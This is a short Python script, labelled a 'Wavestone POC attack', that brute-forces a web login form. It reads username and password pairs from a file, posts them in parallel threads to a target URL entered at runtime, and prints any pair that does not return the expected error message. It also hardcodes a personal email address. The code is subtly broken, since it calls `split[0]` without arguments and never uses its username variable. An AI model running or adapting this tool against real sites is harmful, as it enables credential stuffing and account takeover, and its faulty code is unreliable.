print (""" 

██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ 
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████                                                            
                                                                            
                        Wavestone POC attack
""")

import threading
import requests
import time
import sys

class BruteForceCracker:
    def __init__(self, url, error_message):
        self.url = url
        self.error_message = error_message
        
        for run in banner:
            sys.stdout.write(run)
            sys.stdout.flush()
            time.sleep(0.02)

    def crack(self, username, password):
        data_dict = {"email": username, "password": password}
        response = requests.post(self.url, data=data_dict)
        if self.error_message in str(response.content):
            return False
        
        else:
            print("Username: ---> " + username)
            print("Password: ---> " + password)
            return True

def crack_passwords(usernames_passwords, cracker):
    count = 0
    for username_password in usernames_passwords:
        username = username_password.split[0]
        password = username_password.split[1]
        count += 1
        password = password.strip()
        username = username.strip()
        print("Trying Password & Username : {} Time For => {} : {}".format(count, username, password))
        if cracker.crack(username, password):
            return

def main():
    url = input("Enter Target Url: ")
    error = "Password incorrect! Please try again."
    username="mohamed.mekkouri@student-cs.fr"
    cracker = BruteForceCracker(url, error)
    
    with open("user_passwords.txt", "r") as f:
        chunk_size = 1000
        while True:
            usernames_passwords = f.readlines(chunk_size)
            if not usernames_passwords:
                break
            t = threading.Thread(target=crack_passwords, args=(usernames_passwords, cracker))
            t.start()

if __name__ == '__main__':
    banner = """ 
                       Checking the Server !!        
        [+]█████████████████████████████████████████████████[+]
"""
    print(banner)
    main()